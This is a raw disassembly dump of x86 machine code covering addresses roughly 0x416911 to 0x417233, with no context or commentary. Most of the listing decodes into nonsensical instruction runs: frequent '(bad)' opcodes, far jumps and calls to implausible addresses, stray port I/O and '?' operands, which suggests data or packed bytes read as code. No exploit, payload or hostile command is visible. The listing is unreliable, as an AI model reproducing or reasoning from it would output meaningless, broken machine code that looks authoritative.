  416911:	out    0x5f,eax
  416913:	mov    DWORD PTR [ebx],edx
  416915:	(bad)  
  416916:	push   ds
  416917:	loop   0x41690e
  416919:	add    ebp,ecx
  41691b:	pusha  
  41691c:	mov    dh,bh
  41691e:	fisub  WORD PTR [edi+ebx*1]
  416921:	(bad)  
  416922:	call   0xc5bd3787
  416927:	lods   al,BYTE PTR ds:[esi]
  416928:	add    al,BYTE PTR [ebp+0x8]
	...
  41693a:	pusha  
  41693b:	add    eax,0xe5b46200
  416940:	push   ebx
  416941:	jb     0x41696d
  416943:	(bad)  
  416945:	ins    BYTE PTR es:[edi],dx
  416946:	arpl   di,di
  416948:	cmp    ch,BYTE PTR [esi-0x5974fc2f]
  41694e:	scas   eax,DWORD PTR es:[edi]
  41694f:	jle    0x416994
  416951:	or     eax,0x12ea7c53
  416956:	mov    bh,BYTE PTR [ecx-0x1ae49bb1]
  41695c:	cmp    ebx,DWORD PTR [eax]
  41695e:	(bad)  
  41695f:	inc    edx
  416960:	mov    BYTE PTR ds:0x17e7e543,dl
  416966:	fs paddd mm2,mm0
  41696a:	aam    0xe4
  41696c:	xor    ebx,DWORD PTR [ebx]
  41696e:	adc    edi,DWORD PTR [ebx+edx*2-0x33]
  416972:	xor    BYTE PTR [eax+0x28a97251],bh
  416978:	out    0x78,al
  41697a:	push   0xf
  41697c:	mov    al,BYTE PTR [ecx+0x2123c4d6]
  416982:	mov    dl,0xc0
  416984:	mov    ch,BYTE PTR [edi]
  416986:	inc    edi
  416987:	cmp    al,dh
  416989:	push   esi
  41698a:	dec    edx
  41698b:	retf   
  41698c:	les    esp,FWORD PTR [edx-0x45]
  41698f:	in     al,0x13
  416991:	add    BYTE PTR [esp+edx*1+0x395e4c89],ah
  416998:	mov    DWORD PTR [esi+ebx*2+0x35],edx
  41699c:	xchg   DWORD PTR [eax+eax*1+0x0],ecx
	...
  4169ac:	add    BYTE PTR [esi+0x31],bl
  4169af:	xchg   DWORD PTR [esi+ebp*4+0x38],edx
  4169b3:	mov    DWORD PTR [esi+ebx*4+0x14],eax
  4169b7:	push   ebp
  4169b8:	push   ebp
  4169b9:	jmp    0xfddb:0x6be8cc81
  4169c0:	call   DWORD PTR [ecx]
  4169c2:	cmp    eax,0x53ed3822
  4169c7:	mov    esi,ecx
  4169c9:	add    ecx,esp
  4169cb:	out    0xa3,al
  4169cd:	mov    ebp,ebp
  4169cf:	std    
  4169d0:	cmp    ecx,edi
  4169d2:	ja     0x416a0c
  4169d4:	mov    edi,DWORD PTR [esi]
  4169d6:	and    eax,0x2ffc3b36
  4169db:	add    al,BYTE PTR [eax]
  4169dd:	jp     0x416a5e
  4169df:	pop    es
  4169e0:	and    esp,0x1b
  4169e3:	add    al,BYTE PTR [eax]
  4169e5:	dec    edx
  4169e6:	add    al,0x74
  4169e8:	sbb    BYTE PTR [edi+0x4],dl
  4169eb:	add    eax,0x3783a00
  4169f0:	add    DWORD PTR ds:0x1719740a,0x4
  4169f7:	jge    0x4169f9
  4169f9:	cmp    bh,BYTE PTR [eax+0x3]
  4169fc:	adc    ebp,0x8
  4169ff:	je     0x416a0e
  416a01:	jge    0x416a5c
  416a03:	mov    esi,ecx
  416a05:	repnz loopne 0x4169f7
  416a08:	call   DWORD PTR [ebp+0x1aebfd39]
  416a0e:	sub    DWORD PTR [edx+0x24],0x0
	...
  416a1d:	add    BYTE PTR [eax],al
  416a1f:	add    dl,bh
  416a21:	push   cs
  416a22:	(bad)  
  416a23:	dec    DWORD PTR [edx]
  416a25:	add    al,0x8b
  416a27:	shl    DWORD PTR [ebx+0x3],cl
  416a2a:	xor    DWORD PTR [ecx-0x72],edx
  416a2d:	mov    ds:0xb7a4e748,eax
  416a32:	pop    ss
  416a33:	(bad)  
  416a34:	push   ds
  416a35:	fwait
  416a36:	daa    
  416a37:	add    BYTE PTR [esi-0x37],dl
  416a3a:	mov    DWORD PTR [ebx+0x7f],ebp
  416a3d:	mov    eax,DWORD PTR cs:[ebx-0x79]
  416a41:	push   edx
  416a42:	ret    
  416a43:	inc    edi
  416a44:	jmp    0x7d6:0x6857de51
  416a4b:	sub    ah,0xf5
  416a4e:	pop    ss
  416a4f:	(bad)  
  416a50:	out    0x6,al
  416a52:	or     BYTE PTR [edi+esi*8-0x1ffffde3],al
  416a59:	push   ss
  416a5a:	add    BYTE PTR [edi],cl
  416a5c:	fstp   QWORD PTR [edx-0x6c9cfffe]
  416a62:	(bad)  
  416a63:	and    edx,DWORD PTR [ebx-0x29]
  416a66:	mov    al,dl
  416a68:	cmp    BYTE PTR [edi-0x4d],bl
  416a6b:	push   eax
  416a6c:	fsubr  DWORD PTR [edi+0x2b]
  416a6f:	cs dec ebp
  416a71:	dec    eax
  416a72:	push   ss
  416a73:	mov    ch,BYTE PTR [edi-0x4ea923f8]
  416a79:	mov    ds:0x453b8a45,eax
  416a7e:	add    al,0xf1
  416a80:	cmp    al,0x68
  416a82:	fcmovb st,st(4)
	...
  416a90:	add    BYTE PTR [eax],al
  416a92:	add    BYTE PTR [ecx+ebp*8+0x3487438a],dh
  416a99:	fld    DWORD PTR [ebp+0x2287f]
  416a9f:	xchg   esi,eax
  416aa0:	adc    eax,0x284bbd81
  416aa5:	add    al,BYTE PTR [eax]
  416aa7:	arpl   WORD PTR [eax],dx
  416aa9:	cli    
  416aaa:	cmp    al,0x63
  416aac:	sub    DWORD PTR [edx],eax
  416aae:	add    BYTE PTR [edi+0x5],bh
  416ab1:	in     al,dx
  416ab2:	xor    ch,0x3
  416ab5:	aad    0xdf
  416ab7:	das    
  416ab8:	add    eax,0x916303d4
  416abd:	jecxz  0x416a41
  416abf:	fld    QWORD PTR [edx]
  416ac1:	mov    ebp,0x71b52dfb
  416ac6:	inc    esi
  416ac7:	les    edi,FWORD PTR [edi+esi*1-0x9e53ae9]
  416ace:	mov    eax,0x4c69ae19
  416ad3:	mov    ch,0xaf
  416ad5:	imul   eax,DWORD PTR [eax+0x74],0xd803f043
  416adc:	mov    eax,ds:0x42e9f3c4
  416ae1:	sar    DWORD PTR [esi],1
  416ae3:	and    al,0xb8
  416ae5:	jno    0x416b2d
  416ae7:	test   dh,ch
  416ae9:	push   es
  416aea:	pop    ss
  416aeb:	test   eax,ecx
  416aed:	imul   esp,DWORD PTR [edi],0x2ad39863
  416af3:	fs jp  0x416b2a
  416af6:	loopne 0x416af8
	...
  416b04:	add    BYTE PTR [eax],al
  416b06:	pop    esp
  416b07:	and    BYTE PTR [ecx],0x17
  416b0a:	adc    esi,DWORD PTR [ebx+0x6444561]
  416b10:	xlat   BYTE PTR ds:[ebx]
  416b11:	push   ss
  416b12:	push   ebp
  416b13:	jp     0x416b51
  416b15:	loopne 0x416ac7
  416b17:	push   eax
  416b18:	out    0x3,eax
  416b1a:	arpl   WORD PTR ds:0xe4b136f2,ax
  416b20:	jae    0x416b9c
  416b22:	xor    al,0xe
  416b24:	call   0xfcc8432c
  416b29:	jmp    DWORD PTR [esi+ecx*1]
  416b2c:	cmp    DWORD PTR [ecx+ebp*8+0x720903e],esi
  416b33:	push   cs
  416b34:	jge    0x416b3a
  416b36:	mov    ebp,0x60ecfff8
  416b3b:	add    eax,0x2f198c03
  416b40:	jno    0x416b8e
  416b42:	loope  0x416b7e
  416b44:	(bad)  
  416b45:	call   0xe94555c0
  416b4a:	pusha  
  416b4b:	or     BYTE PTR [edx-0x20],0xf3
  416b4f:	in     al,dx
  416b50:	mov    ch,BYTE PTR [edi-0x30]
  416b53:	add    DWORD PTR [eax],eax
  416b55:	jmp    0xed58f339
  416b5a:	pusha  
  416b5b:	add    eax,0xe9e66040
  416b60:	add    ebp,ecx
  416b62:	pusha  
  416b63:	jl     0x416aea
  416b65:	stc    
  416b66:	lods   al,BYTE PTR ds:[esi]
  416b67:	or     eax,0x62fe
	...
  416b78:	add    BYTE PTR [esi],ah
  416b7a:	test   BYTE PTR [ebx],0xe9
  416b7d:	pusha  
  416b7e:	jnp    0x416b8f
  416b80:	jmp    0x416bd4
  416b82:	adc    cl,al
  416b84:	jno    0x416b16
  416b86:	add    al,0x9e
  416b88:	aad    0x84
  416b8a:	or     eax,0x7a7f74fe
  416b8f:	test   ecx,edi
  416b91:	je     0x416ba0
  416b93:	(bad)  
  416b94:	jo     0x416b83
  416b96:	cmc    
  416b97:	add    ebp,ecx
  416b99:	pusha  
  416b9a:	lds    ecx,FWORD PTR [eax+0x95b5f]
  416ba0:	jmp    0xe550ee8e
  416ba5:	pusha  
  416ba6:	add    eax,0x9476f8b
  416bab:	add    cl,ch
  416bad:	jmp    0x8746:0x4dbb01fc
  416bb4:	stc    
  416bb5:	popa   
  416bb6:	imul   ebx,DWORD PTR [ebx],0xffffffed
  416bb9:	pusha  
  416bba:	add    eax,0x82ebf075
  416bbf:	sldt   WORD PTR [esi]
  416bc2:	or     DWORD PTR [eax],eax
  416bc4:	mov    DWORD PTR [ecx+ecx*1+0x48fa0002],eax
  416bcb:	xchg   DWORD PTR [esi-0x1f2d2],ecx
  416bd1:	jae    0x416b5e
  416bd3:	push   cs
  416bd4:	add    al,0xfa
  416bd6:	or     BYTE PTR [ebx-0x1f30d7a],cl
  416bdc:	inc    DWORD PTR [eax]
	...
  416bea:	add    BYTE PTR [eax],al
  416bec:	call   0xfe0c:0xba868921
  416bf3:	inc    DWORD PTR [ecx+eax*1+0xd3c8b00]
  416bfa:	add    al,BYTE PTR [eax]
  416bfc:	retf   0x847d
  416bff:	sbb    dh,al
  416c01:	or     BYTE PTR [eax],al
  416c03:	add    DWORD PTR [ecx+edx*1],ebx
  416c06:	add    al,BYTE PTR [eax]
  416c08:	mov    edx,0xaad2cb1d
  416c0d:	jge    0x416c51
  416c0f:	and    al,0xbe
  416c11:	mov    edi,DWORD PTR [esi+0x4a7dcb74]
  416c17:	and    al,0xda
  416c19:	jge    0x416baf
  416c1b:	adc    BYTE PTR [esi+0x362b0008],al
  416c21:	and    eax,0x81f1514e
  416c26:	adc    al,BYTE PTR [edx+edi*2]
  416c29:	or     BYTE PTR [ebx],ch
  416c2b:	dec    esp
  416c2c:	push   cx
  416c2e:	push   eax
  416c2f:	push   ecx
  416c30:	jne    0x416c24
  416c32:	into   
  416c33:	add    DWORD PTR [esi],0x18
  416c36:	add    eax,0xffffff87
  416c39:	std    
  416c3a:	pop    esp
  416c3b:	mov    ecx,DWORD PTR [ecx]
  416c3d:	dec    ebp
  416c3e:	pop    ebp
  416c3f:	pop    esi
  416c40:	leave  
  416c41:	int3   
  416c42:	ss ret 0x162
  416c46:	mov    eax,DWORD PTR [esi-0x1f19d]
  416c4c:	sbb    al,0x47
  416c4e:	mov    esi,0x23
	...
  416c5f:	mov    bl,0xe1
  416c61:	mov    eax,0x3e9fad5e
  416c66:	aaa    
  416c67:	and    DWORD PTR [esi],esi
  416c69:	add    bh,BYTE PTR [eax+0x81e63]
  416c6f:	and    BYTE PTR [edi-0x6898dc42],dl
  416c75:	dec    edx
  416c76:	sar    dl,0x1e
  416c79:	test   DWORD PTR [ebx+0x6b],eax
  416c7c:	pop    esi
  416c7d:	aas    
  416c7e:	mov    bl,BYTE PTR [edi]
  416c80:	cli    
  416c81:	pop    es
  416c82:	cmp    DWORD PTR [edi+0x63fffff9],0x64744299
  416c8c:	popf   
  416c8d:	sub    ebx,DWORD PTR ds:[edi+0x1e]
  416c91:	add    al,bl
  416c93:	fcomp  DWORD PTR [ecx+0x1e5f43de]
  416c99:	add    cl,BYTE PTR [ebx+0x3c241f7]
  416c9f:	arpl   WORD PTR [esi],bx
  416ca1:	mov    cl,0x8a
  416ca3:	fild   WORD PTR [ecx-0x3e]
  416ca6:	add    esp,DWORD PTR [ebx+0x1e]
  416ca9:	mov    al,0x8a
  416cab:	xlat   BYTE PTR ds:[ebx]
  416cac:	inc    ecx
  416cad:	(bad)  
  416cae:	add    esp,DWORD PTR [ebx+0x1e]
  416cb1:	mov    bl,0x4f
  416cb3:	fsub   DWORD PTR [ecx+0x1e5f3fe7]
  416cb9:	add    dl,BYTE PTR [edx-0x4d]
  416cbc:	test   eax,0x347b23bf
  416cc1:	mov    bl,0xf4
	...
  416ccf:	add    BYTE PTR [eax],al
  416cd1:	add    BYTE PTR [esp+ecx*2-0x7c],cl
  416cd5:	ret    
  416cd6:	ja     0x416cf0
  416cd8:	add    al,BYTE PTR [eax]
  416cda:	and    BYTE PTR [ecx+0x3f],ch
  416cdd:	retf   
  416cde:	daa    
  416cdf:	push   es
  416ce0:	mov    ch,0x40
  416ce2:	sbb    BYTE PTR [edx],bh
  416ce4:	lods   al,BYTE PTR ds:[esi]
  416ce5:	inc    eax
  416ce6:	sbb    BYTE PTR [edx],bh
  416ce8:	cmp    edi,DWORD PTR [ebp+0x7]
  416ceb:	test   DWORD PTR [esp+edx*1+0x14],edi
  416cef:	or     ebp,eax
  416cf1:	mov    dh,0xb6
  416cf3:	mov    dl,0x71
  416cf5:	mov    ecx,0x391d45c
  416cfa:	mov    ch,0x56
  416cfc:	in     al,dx
  416cfd:	shl    DWORD PTR [ebx+0x23147005],0xe
  416d04:	jmp    0xf9431a0b
  416d09:	jl     0x416cde
  416d0b:	xchg   BYTE PTR [edi+0xb],al
  416d0e:	fs push edx
  416d10:	je     0x416d0f
  416d12:	pop    eax
  416d13:	mov    ebx,0x3dde03a7
  416d18:	in     eax,0x78
  416d1a:	xchg   ebx,eax
  416d1b:	cli    
  416d1c:	jbe    0x416d63
  416d1e:	fadd   st(1),st
  416d20:	add    edi,DWORD PTR [ecx+eiz*1]
  416d23:	xchg   BYTE PTR [ecx],ah
  416d25:	int3   
  416d26:	sub    BYTE PTR [edi+edx*8],dh
  416d29:	xor    eax,0xff8b8606
  416d2e:	arpl   WORD PTR [eax+0x129c7cf2],dx
  416d34:	and    BYTE PTR [ecx+0x0],al
	...
  416d42:	add    BYTE PTR [eax],al
  416d44:	add    BYTE PTR [eax],bl
  416d46:	add    eax,0x78611ed7
  416d4b:	fdivr  st(5),st
  416d4d:	out    0x8c,eax
  416d4f:	out    0x86,eax
  416d51:	ror    BYTE PTR [eax-0x8],0x12
  416d55:	gs or  ch,al
  416d58:	xchg   BYTE PTR [eax],al
  416d5a:	js     0x416d54
  416d5c:	adc    dl,BYTE PTR [ebp+0xa]
  416d5f:	call   0x773b9738
  416d64:	test   DWORD PTR [eax],edx
  416d66:	mov    ebx,0x786727ff
  416d6b:	xor    edx,ecx
  416d6d:	fld    QWORD PTR [edi]
  416d6f:	sbb    esp,DWORD PTR [ebp*1+0x68d4437c]
  416d76:	add    BYTE PTR [ebx-0xc],0x90
  416d7a:	pop    ds
  416d7b:	pop    es
  416d7c:	arpl   WORD PTR [ecx+edx*8],bx
  416d7f:	stos   DWORD PTR es:[edi],eax
  416d80:	jno    0x416da6
  416d82:	jmp    0xf1d9816
  416d87:	sbb    esi,ebp
  416d89:	dec    edi
  416d8a:	dec    edi
  416d8b:	sbb    ebp,ecx
  416d8d:	pusha  
  416d8e:	add    eax,0x55e69f0f
  416d93:	dec    ebp
  416d94:	test   al,0x60
  416d96:	js     0x416dcb
  416d98:	icebp  
  416d99:	in     eax,0x7
  416d9b:	aaa    
  416d9c:	int3   
  416d9d:	(bad)  
  416d9e:	jnp    0x416de3
  416da0:	cld    
  416da1:	mov    BYTE PTR [edx+0x1f50dc43],al
  416da7:	pop    es
  416da8:	arpl   WORD PTR [eax],ax
	...
  416db6:	add    BYTE PTR [eax],al
  416db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416db9:	shr    BYTE PTR [ebx-0x7017639f],1
  416dbf:	stos   BYTE PTR es:[edi],al
  416dc0:	in     eax,0xe
  416dc2:	aaa    
  416dc3:	popf   
  416dc4:	ja     0x416d9b
  416dc6:	(bad)  
  416dc8:	cmp    al,BYTE PTR [edi+0x99f9fc3]
  416dce:	jle    0x416d55
  416dd0:	pop    ebx
  416dd1:	jne    0x416dd2
  416dd3:	je     0x416e37
  416dd5:	jle    0x416dda
  416dd7:	push   esp
  416dd8:	mov    WORD PTR [edi-0x7a8816c0],?
  416dde:	mov    ecx,?
  416de0:	push   ebx
  416de1:	or     edi,esi
  416de3:	out    dx,al
  416de4:	or     al,BYTE PTR [edi+0x92027db]
  416dea:	jle    0x416e39
  416dec:	pop    esp
  416ded:	jne    0x416dee
  416def:	dec    DWORD PTR [esi-0x58fb74fd]
  416df5:	adc    eax,0xc4a414c
  416dfa:	cmp    BYTE PTR [ebp-0x209e6],0x79
  416e01:	cmp    cl,0x18
  416e04:	inc    esi
  416e05:	mov    edi,0x11f08340
  416e0a:	or     eax,0xfdf6308c
  416e0f:	call   DWORD PTR [edi-0x7a00f180]
  416e15:	test   BYTE PTR [esi-0x18],0x3
  416e19:	add    eax,0x0
	...
  416e2a:	add    BYTE PTR [ebp+0x53],ah
  416e2d:	pop    ecx
  416e2e:	mov    DWORD PTR [esi-0x5f73fa8],edx
  416e34:	dec    edi
  416e35:	xchg   ebp,esp
  416e37:	dec    ebx
  416e38:	in     eax,0x7e
  416e3a:	add    dl,cl
  416e3c:	add    al,0x53
  416e3e:	push   esi
  416e3f:	in     eax,dx
  416e40:	mov    DWORD PTR [ebx+0x8],eax
  416e43:	aaa    
  416e44:	push   eax
  416e45:	jle    0x416e00
  416e47:	call   0x81c2:0x43000004
  416e4e:	sar    BYTE PTR [esi+0x5c813189],0x1
  416e55:	add    ah,bh
  416e57:	mov    al,bl
  416e59:	in     al,0x6
  416e5b:	add    DWORD PTR [edx],edi
  416e5d:	jg     0x416e46
  416e5f:	cmp    al,BYTE PTR [esi]
  416e61:	add    BYTE PTR [eax],al
  416e63:	cmp    ebx,esi
  416e65:	or     BYTE PTR [ecx],cl
  416e67:	je     0x416df2
  416e69:	sbb    DWORD PTR ss:[ebp+0x1],0xc37afc00
  416e71:	in     eax,dx
  416e72:	or     dh,BYTE PTR [ebx-0xa]
  416e75:	xchg   DWORD PTR [edx],esi
  416e77:	arpl   WORD PTR [ebp+0x22218238],sp
  416e7d:	jnp    0x416eb6
  416e7f:	loop   0x416eb7
  416e81:	inc    edx
  416e82:	push   cs
  416e83:	arpl   WORD PTR [esi],bx
  416e85:	inc    ecx
  416e86:	out    dx,al
  416e87:	gs and edx,eax
  416e8a:	mov    BYTE PTR [ebp-0x5d],dh
  416e8d:	rol    DWORD PTR [eax+0x0],cl
	...
  416e9b:	add    BYTE PTR [eax],al
  416e9d:	add    BYTE PTR [ebp+0x1e],al
  416ea0:	adc    al,BYTE PTR [edx]
  416ea2:	arpl   WORD PTR [ebp+0x28],bx
  416ea5:	or     ebp,eax
  416ea7:	adc    al,BYTE PTR [ebx+0x235d54e2]
  416ead:	cvtps2pd xmm4,QWORD PTR [eax+0x7b]
  416eb1:	pop    ss
  416eb2:	loop   0x416f2e
  416eb4:	add    dh,al
  416eb6:	pusha  
  416eb7:	push   ds
  416eb8:	inc    ecx
  416eb9:	jmp    0x9531:0x8830255f
  416ec0:	xor    eax,DWORD PTR [edx+0x2f7b2221]
  416ec6:	loopne 0x416e7f
  416ec8:	iret   
  416ec9:	or     dl,BYTE PTR [eax-0x1fb72c5b]
  416ecf:	fld    QWORD PTR [esi]
  416ed1:	test   DWORD PTR [edx+0x268c8850],ebx
  416ed7:	sahf   
  416ed8:	mov    dl,0xe7
  416eda:	jl     0x416efa
  416edc:	add    al,BYTE PTR [eax]
  416ede:	or     al,0x40
  416ee0:	stos   DWORD PTR es:[edi],eax
  416ee1:	mov    BYTE PTR [edi+0x63034448],dh
  416ee7:	mov    ds:0xb45f23c6,eax
  416eec:	xchg   esi,eax
  416eed:	dec    ebx
  416eee:	and    bl,BYTE PTR [esi]
  416ef0:	jnp    0x416efb
  416ef2:	ficom  DWORD PTR ds:0x9b67c183
  416ef8:	inc    edx
  416ef9:	add    esp,edx
  416efb:	adc    edx,DWORD PTR ds:0xe905224b
  416f01:	xchg   ecx,eax
	...
  416f0e:	add    BYTE PTR [eax],al
  416f10:	add    BYTE PTR [esi+0x42],dh
  416f13:	in     al,0x3
  416f15:	call   0x19497bdb
  416f1a:	xchg   edx,eax
  416f1b:	sbb    al,0xc5
  416f1d:	dec    esp
  416f1e:	jl     0x416f10
  416f20:	jl     0x416f7c
  416f22:	sub    BYTE PTR [eax-0x13bc1ff8],0x84
  416f29:	cmp    dl,BYTE PTR [edx]
  416f2b:	sbb    al,0xc5
  416f2d:	sub    al,0x95
  416f2f:	xchg   esi,eax
  416f30:	inc    edx
  416f31:	pusha  
  416f32:	add    eax,0xb6077d34
  416f37:	cmp    BYTE PTR [ebx+0x7ae0c0e9],dh
  416f3d:	scas   eax,DWORD PTR es:[edi]
  416f3e:	stc    
  416f3f:	jae    0x416efa
  416f41:	or     al,0xb4
  416f43:	sbb    BYTE PTR [ebx*2-0x74fc16fb],bl
  416f4a:	xchg   ecx,eax
  416f4b:	sbb    al,0xc5
  416f4d:	in     al,dx
  416f4e:	jns    0x416efb
  416f50:	or     edx,DWORD PTR [ebp+ebx*1+0x563042f]
  416f57:	mov    edx,0xb80d1f80
  416f5c:	sbb    edi,DWORD PTR [eax*1+0x7c2803e9]
  416f63:	dec    esp
  416f64:	mov    cl,0xa2
  416f66:	std    
  416f67:	call   0x503591e
  416f6c:	cld    
  416f6d:	fnstenv [ecx+0x44dbffcc]
  416f73:	test   al,0xfe
	...
  416f81:	add    BYTE PTR [eax],al
  416f83:	add    dh,dl
  416f85:	cld    
  416f86:	daa    
  416f87:	and    eax,0x7ce27c6c
  416f8c:	mov    ds:0x5b55f5c5,eax
  416f91:	inc    esp
  416f92:	pop    es
  416f93:	hlt    
  416f94:	imul   edi,ebx,0x7d795fff
  416f9a:	shr    BYTE PTR [ecx-0x57f7af93],0x3f
  416fa1:	dec    BYTE PTR [edx]
  416fa3:	repz (bad) 
  416fa6:	mov    BYTE PTR [eax+0x600343e1],bh
  416fac:	mov    eax,ds:0x397f0ec6
  416fb1:	std    
  416fb2:	sbb    BYTE PTR [eax-0x59],dh
  416fb5:	(bad)  
  416fb6:	push   cs
  416fb7:	jg     0x416ff0
  416fb9:	inc    ebp
  416fba:	loopne 0x416f8d
  416fbc:	scas   eax,DWORD PTR es:[edi]
  416fbd:	cld    
  416fbe:	mov    BYTE PTR [eax-0xf4a08e0],ch
  416fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fc5:	and    eax,0x7d1ae20f
  416fca:	or     DWORD PTR [eax-0x59],esp
  416fcd:	(bad)  
  416fce:	push   cs
  416fcf:	aas    
  416fd0:	pop    es
  416fd1:	inc    ebp
  416fd2:	loopne 0x416fc5
  416fd4:	stc    
  416fd5:	sti    
  416fd6:	push   cs
  416fd7:	aas    
  416fd8:	pusha  
  416fd9:	cld    
  416fda:	shl    BYTE PTR [eax-0x16],0xaa
  416fde:	shl    ecx,0x60
  416fe1:	mov    dl,0x8a
  416fe3:	mov    ch,0xc4
  416fe5:	std    
  416fe6:	mov    ah,BYTE PTR [ebp+0x0]
	...
  416ff4:	add    BYTE PTR [eax],al
  416ff6:	add    BYTE PTR [ecx+edi*8+0x1e27eb8a],bh
  416ffd:	pop    ss
  416ffe:	jno    0x41705f
  417000:	les    ecx,FWORD PTR [edx+0xf1e27eb]
  417006:	popa   
  417007:	pop    edi
  417008:	les    ecx,FWORD PTR [edx+0x71e27eb]
  41700e:	jno    0x41706f
  417010:	les    ecx,FWORD PTR [eax-0x308358ce]
  417016:	push   0x22
  417018:	add    cl,BYTE PTR [ebx-0x74fcf717]
  41701e:	add    BYTE PTR [eax-0x40],bh
  417021:	out    0x18,al
  417023:	repnz add BYTE PTR [ecx-0x75],al
  417027:	mov    al,al
  417029:	out    0x10,al
  41702b:	add    al,BYTE PTR [ecx]
  41702d:	inc    ecx
  41702e:	mov    edi,DWORD PTR [eax-0x3e]
  417031:	out    0x8,al
  417033:	ror    BYTE PTR [eax],cl
  417035:	aas    
  417036:	mov    ebx,DWORD PTR [eax-0x7f]
  417039:	int    0x88
  41703b:	cmp    ebp,DWORD PTR [esi-0x43c5f741]
  417041:	mov    ch,ah
  417043:	leave  
  417044:	and    eax,0xba545309
  417049:	mov    al,BYTE PTR [ebp+0xe]
  41704c:	jle    0x4170a2
  41704e:	or     BYTE PTR [ecx+0x124d8af7],dh
  417054:	jle    0x41709e
  417056:	add    al,0x83
  417058:	ss shr bl,0x0
	...
  417068:	add    BYTE PTR [eax],al
  41706a:	push   es
  41706b:	fmul   st,st(2)
  41706d:	sbb    ecx,0xd0f0f02
  417073:	fcomp  st(0)
  417075:	mov    esp,ecx
  417077:	dec    eax
  417078:	jecxz  0x41707e
  41707a:	stos   DWORD PTR es:[edi],eax
  41707b:	push   ss
  41707c:	mov    dh,dl
  41707e:	cmp    esp,DWORD PTR [ebx]
  417080:	or     eax,0xf2808c31
  417085:	sub    DWORD PTR [ecx],0xba00fe12
  41708b:	xlat   BYTE PTR ds:[ebx]
  41708c:	fmul   DWORD PTR [ecx+0x10e3487c]
  417092:	mov    ebx,0x8bce8816
  417097:	and    edi,edi
  417099:	xor    BYTE PTR [eax+eax*4-0xe],dl
  41709d:	sbb    DWORD PTR [ecx-0x2a],0xd7b93332
  4170a4:	xlat   BYTE PTR ds:[ebx]
  4170a5:	mov    DWORD PTR [ebx+0x3c],esp
  4170a8:	inc    ecx
  4170a9:	in     eax,0x61
  4170ab:	fst    QWORD PTR [edx]
  4170ad:	mov    BYTE PTR [ebp+0x32071e2d],dl
  4170b3:	sbb    al,0x79
  4170b5:	repnz loop 0x4170c7
  4170b8:	or     edi,edi
  4170ba:	ins    DWORD PTR es:[edi],dx
  4170bb:	out    dx,al
  4170bc:	rcr    cl,cl
  4170be:	fcmove st,st(4)
  4170c0:	inc    edx
  4170c1:	in     eax,0x6b
  4170c3:	sbb    eax,0xdace883e
  4170c8:	add    dh,dh
  4170ca:	fcom   DWORD PTR [eax+0x10]
  4170cd:	rol    BYTE PTR [eax],0x0
	...
  4170dc:	add    BYTE PTR [ebx+ebp*8],dh
  4170df:	and    dh,0x62
  4170e2:	jne    0x4170f6
  4170e4:	or     BYTE PTR [edx],bh
  4170e6:	xor    esi,DWORD PTR gs:[eax]
  4170e9:	sbb    eax,0x40801065
  4170ee:	pop    eax
  4170ef:	push   edi
  4170f0:	test   eax,0x3027dcc9
  4170f5:	cmp    ch,BYTE PTR [ecx-0x2b]
  4170f8:	adc    edx,ebx
  4170fa:	mov    edx,0x6f64ee42
  4170ff:	and    al,0x0
  417101:	jmp    0xc31:0x1cf9fa7f
  417108:	pop    es
  417109:	arpl   si,bp
  41710b:	add    DWORD PTR [ecx+0x1b232d15],ecx
  417111:	jmp    0x1065:0x5fee4232
  417118:	or     al,cl
  41711a:	fs inc ebx
  41711c:	and    BYTE PTR [ebx-0x15e22f0f],0x23
  417123:	and    ch,0x74
  417126:	addr16 aad 0xb4
  417129:	mov    bh,0x99
  41712b:	ret    0xdbff
  41712e:	add    al,0x46
  417130:	inc    edx
  417131:	lea    ecx,[edx]
  417133:	push   0xe7049824
  417138:	add    ebx,DWORD PTR [eax-0x44]
  41713b:	adc    esi,DWORD PTR [ecx+0x2c700523]
	...
  41714d:	add    BYTE PTR [eax],al
  41714f:	add    BYTE PTR [ebx+0x7d82edf3],ah
  417155:	add    al,ch
  417157:	add    esp,DWORD PTR [ebx+0x10]
  41715a:	ss pop ss
  41715c:	adc    al,0x46
  41715e:	out    0x7c,eax
  417160:	cmp    eax,0xe3f2cec5
  417165:	jmp    0x52e2:0x56304d3
  41716c:	push   eax
  41716d:	push   esp
  41716e:	sub    BYTE PTR [edx+ebp*8],al
  417171:	js     0x417126
  417173:	jge    0x417193
  417175:	xchg   DWORD PTR [edi-0x5312600],esp
  41717b:	jmp    0x22ac555b
  417180:	pop    ebp
  417181:	mov    ss,ebx
  417183:	push   eax
  417184:	adc    BYTE PTR [ecx+0x28],bl
  417187:	add    al,0x58
  417189:	js     0x41711e
  41718b:	jge    0x4171b2
  41718d:	lds    edx,FWORD PTR [esi+0x7beae202]
  417193:	add    al,0x63
  417195:	add    eax,0x56f052e2
  41719a:	sub    BYTE PTR [edx+ebx*8],al
  41719d:	loop   0x4171c7
  41719f:	sbb    ebp,DWORD PTR [esi-0x7c]
  4171a2:	inc    esi
  4171a3:	or     ah,dl
  4171a5:	add    ch,al
  4171a7:	(bad)  
  4171a8:	adc    eax,0xc4c4b8fa
  4171ad:	lea    esp,[esi]
  4171af:	inc    ebp
  4171b0:	int    0x1b
  4171b2:	push   0x23
	...
  4171c3:	mov    eax,0x60e90005
  4171c8:	push   cs
  4171c9:	mov    ch,0x35
  4171cb:	call   0x77197215
  4171d0:	(bad)  
  4171d1:	(bad)  
  4171d2:	sub    BYTE PTR [ecx+0x1e],al
  4171d5:	xchg   DWORD PTR [esi],edi
  4171d7:	es repz add al,0x60
  4171db:	ins    BYTE PTR es:[edi],dx
  4171dc:	or     eax,0x872170f9
  4171e1:	shl    ch,0x8d
  4171e4:	and    BYTE PTR [edi+0x3de8e417],al
  4171ea:	bound  edx,QWORD PTR [ebx+0x263df4b9]
  4171f0:	add    cl,BYTE PTR [ecx+0x6f39fbe]
  4171f6:	push   0xe900fe81
  4171fb:	pusha  
  4171fc:	push   cs
  4171fd:	mov    ch,0xbd
  4171ff:	test   BYTE PTR [eax+eax*1+0x70],0x89
  417204:	(bad)
  417207:	out    0xea,eax
  417209:	cld    
  41720a:	jmp    0x5e4a776f
  41720f:	ins    BYTE PTR es:[edi],dx
  417210:	push   edx
  417211:	aas    
  417212:	jmp    0x870155ae
  417217:	adc    al,BYTE PTR [ebp+0x5608de5]
  41721d:	add    dl,dh
  41721f:	xchg   ecx,eax
  417220:	test   BYTE PTR [esi+0x28],0x5f
  417224:	mov    WORD PTR [ebx+0x7d],?
	...
  417233:	add    BYTE PTR [eax],al
